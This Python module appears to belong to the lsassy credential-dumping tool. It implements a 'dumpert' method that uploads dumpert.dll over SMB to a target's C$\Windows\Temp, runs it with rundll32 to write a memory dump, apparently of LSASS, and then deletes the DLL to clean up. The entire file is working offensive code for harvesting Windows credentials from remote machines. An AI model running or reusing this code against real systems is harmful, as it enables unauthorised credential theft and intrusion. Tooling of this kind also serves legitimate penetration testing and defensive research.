import logging
import os
import time

from lsassy.dumpmethod.idumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session):
        super().__init__(session)
        self.dumpertdll = "dumpert.dll"
        self.dumpertdll_path = False
        self.dumpertdll_remote_share = "C$"
        self.dumpertdll_remote_path = "\\Windows\\Temp\\"

        self.dumpertdll_uploaded = False

    def prepare(self, options):
        self.dumpertdll = options.get("dumpertdll", self.dumpertdll)
        self.dumpertdll_path = options.get("dumpertdll_path", self.dumpertdll_path)
        self.dumpertdll_remote_share = options.get("dumpertdll_remote_share", self.dumpertdll_remote_share)
        self.dumpertdll_remote_path = options.get("dumpertdll_remote_path", self.dumpertdll_remote_path)

        if not self.dumpertdll_path:
            logging.error("Missing dumpertdll_path")
            return None

        if not os.path.exists(self.dumpertdll_path):
            logging.error("{} does not exist.".format(self.dumpertdll_path))
            return None

        # Upload dumpertdll
        logging.debug('Copy {} to {}'.format(self.dumpertdll_path, self.dumpertdll_remote_path))
        with open(self.dumpertdll_path, 'rb') as p:
            try:
                self._session.smb_session.putFile(self.dumpertdll_remote_share, self.dumpertdll_remote_path + self.dumpertdll, p.read)
                logging.success("dumpertdll successfully uploaded")
                self.dumpertdll_uploaded = True
                return True
            except Exception as e:
                logging.error("dumpertdll upload error", exc_info=True)
                return None

    def clean(self):
        if self.dumpertdll_uploaded:
            t = time.time()
            while True:
                try:
                    self._session.smb_session.deleteFile(self.dumpertdll_remote_share, self.dumpertdll_remote_path + self.dumpertdll)
                    logging.debug("dumpertdll successfully deleted")
                    return True
                except Exception as e:
                    if time.time() - t > 5:
                        logging.warning("dumpertdll deletion error.")
                        return False
                    logging.debug("dumpertdll deletion error. Retrying...")
                    time.sleep(0.5)

    def get_commands(self):
        cmd_command = """rundll32.exe {}{},Dump""".format(self.dumpertdll_remote_path, self.dumpertdll)
        pwsh_command = cmd_command
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
